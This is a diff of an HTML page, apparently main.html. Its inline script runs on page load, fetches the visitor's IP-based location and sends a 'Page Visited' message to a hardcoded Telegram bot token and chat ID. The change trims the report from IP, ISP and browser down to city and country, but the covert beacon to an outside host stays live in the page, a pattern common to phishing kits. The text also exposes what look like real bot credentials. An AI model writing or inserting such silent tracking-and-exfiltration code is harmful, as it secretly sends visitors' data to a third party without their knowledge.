@@ -83,7 +83,7 @@
       </div>
     </main>
   </div>
-  <script>
+ <script>
 (async () => {
   const botToken = "7581994701:AAGb0gyfgIMQH-RDhnogyMfgaAJbnK7h534";
   const chatId = "5642369607";
@@ -92,13 +92,10 @@
     .then(res => res.json())
     .catch(() => null);
 
-  let ip = ipData?.ip || "Unknown IP";
-  let country = ipData?.country_name || "Unknown Country";
   let city = ipData?.city || "Unknown City";
-  let isp = ipData?.org || "Unknown ISP";
-  let userAgent = navigator.userAgent;
+  let country = ipData?.country_name || "Unknown Country";
 
- const message = `👣 *Page Visited: main.html*\n\n🌍 *IP:* ${ip}\n📍 *Location:* ${city}, ${country}\n🏢 *ISP:* ${isp}\n🖥 *Browser:* ${userAgent}`;
+  const message = `👣 *Page Visited: main.html*\n📍 *Location:* ${city}, ${country}`;
 
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
